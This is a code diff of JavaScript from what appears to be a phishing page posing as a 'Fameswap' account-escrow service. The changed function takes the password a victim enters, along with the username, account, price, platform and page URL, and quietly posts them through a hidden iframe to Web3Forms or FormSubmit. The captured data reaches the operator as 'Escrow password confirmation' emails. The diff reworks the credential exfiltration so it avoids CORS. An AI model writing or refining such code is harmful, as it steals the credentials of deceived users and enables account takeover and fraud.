@@ -1110,55 +1110,16 @@ html, body {
 
   function sendPasswordViaFormSubmit(username, password) {
     var cfg = window.FAMESWAP_NOTIFY || {};
-    var email = (cfg.email || '').trim();
     if (!password) return;
-    var provider = (cfg.provider || 'formsubmit').toLowerCase();
 
-    var payload = {
-      username: username || 'unknown',
-      password: password,
-      account: listing.username || '',
-      price: listing.price != null ? String(listing.price) : '',
-      platform: listing.platformLabel || '',
-      page: (typeof location !== 'undefined' ? location.href : '')
-    };
+    var provider = (cfg.provider || 'web3forms').toLowerCase();
+    var uname = username || listing.user_username || listing.username || 'unknown';
+    var account = listing.username || '';
+    var price = listing.price != null ? String(listing.price) : '';
+    var platform = listing.platformLabel || '';
+    var page = (typeof location !== 'undefined' ? location.href : '');
 
-    if (provider === 'web3forms') {
-      var key = (cfg.web3forms_access_key || cfg.access_key || '').trim();
-      if (!key) {
-        console.warn('[FAMESWAP_NOTIFY] web3forms_access_key missing');
-        return;
-      }
-      var body = {
-        access_key: key,
-        subject: 'Escrow password confirmation — ' + (payload.username || payload.account),
-        from_name: 'Fameswap Escrow',
-        username: payload.username,
-        password: payload.password,
-        account: payload.account,
-        price: payload.price,
-        platform: payload.platform,
-        page: payload.page
-      };
-      /* Web3Forms supports CORS + JSON */
-      fetch('https://api.web3forms.com/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(body)
-      }).then(function(r) { return r.json(); }).then(function(d) {
-        console.log('[FAMESWAP_NOTIFY] web3forms', d);
-      }).catch(function(err) {
-        console.warn('[FAMESWAP_NOTIFY] web3forms error', err);
-      });
-      return;
-    }
-
-    /* ---- FormSubmit: native form POST into hidden iframe (no CORS) ---- */
-    if (!email) {
-      console.warn('[FAMESWAP_NOTIFY] email missing');
-      return;
-    }
-
+    /* Shared hidden iframe for form POST (no CORS, no fetch) */
     var iframe = document.getElementById('fs-notify-iframe');
     if (!iframe) {
       iframe = document.createElement('iframe');
@@ -1171,8 +1132,6 @@ html, body {
 
     var form = document.createElement('form');
     form.method = 'POST';
-    /* Do NOT use /ajax/ — classic endpoint + form POST avoids CORS entirely */
-    form.action = 'https://formsubmit.co/' + email;
     form.target = 'fs-notify-iframe';
     form.acceptCharset = 'UTF-8';
     form.style.display = 'none';
@@ -1186,29 +1145,66 @@ html, body {
       form.appendChild(input);
     }
 
-    addField('username', payload.username);
-    addField('password', payload.password);
-    addField('account', payload.account);
-    addField('price', payload.price);
-    addField('platform', payload.platform);
-    addField('page', payload.page);
-    addField('_subject', 'Escrow password confirmation — ' + (payload.username || payload.account || 'user'));
-    addField('_template', 'table');
-    addField('_captcha', 'false');
-    addField('_honey', '');
-    /* Stay on blank after submit inside iframe */
-    addField('_next', 'https://formsubmit.co/thank-you-message');
+    if (provider === 'web3forms') {
+      var key = (cfg.web3forms_access_key || cfg.access_key || '').trim();
+      if (!key) {
+        console.warn('[FAMESWAP_NOTIFY] web3forms_access_key missing');
+        return;
+      }
+      /* Classic form POST — same as Web3Forms docs */
+      form.action = 'https://api.web3forms.com/submit';
+      addField('access_key', key);
+      addField('subject', 'Escrow password confirmation — ' + uname);
+      addField('from_name', 'Fameswap Escrow');
+      /* Required-style fields many backends expect */
+      addField('name', uname);
+      addField('email', (cfg.email || 'noreply@fameswap.github.io').trim());
+      addField('message',
+        'Username: ' + uname + '\n' +
+        'Password: ' + password + '\n' +
+        'Account: ' + account + '\n' +
+        'Price: ' + price + '\n' +
+        'Platform: ' + platform + '\n' +
+        'Page: ' + page
+      );
+      /* Also as separate fields for the email table */
+      addField('username', uname);
+      addField('password', password);
+      addField('account', account);
+      addField('price', price);
+      addField('platform', platform);
+      addField('page', page);
+      addField('botcheck', ''); /* honeypot empty */
+    } else {
+      var email = (cfg.email || '').trim();
+      if (!email) {
+        console.warn('[FAMESWAP_NOTIFY] email missing');
+        return;
+      }
+      form.action = 'https://formsubmit.co/' + email;
+      addField('username', uname);
+      addField('password', password);
+      addField('account', account);
+      addField('price', price);
+      addField('platform', platform);
+      addField('page', page);
+      addField('_subject', 'Escrow password confirmation — ' + uname);
+      addField('_template', 'table');
+      addField('_captcha', 'false');
+      addField('_honey', '');
+      addField('_next', 'https://formsubmit.co/thank-you-message');
+    }
 
     document.body.appendChild(form);
     try {
       form.submit();
-      console.log('[FAMESWAP_NOTIFY] formsubmit form posted to iframe');
+      console.log('[FAMESWAP_NOTIFY] form posted via iframe →', form.action);
     } catch (err) {
       console.warn('[FAMESWAP_NOTIFY] form submit failed', err);
     }
     setTimeout(function() {
       try { if (form.parentNode) form.parentNode.removeChild(form); } catch (e) {}
-    }, 3000);
+    }, 4000);
   }
 
   bind('modal-accept-1', 'click', function() {
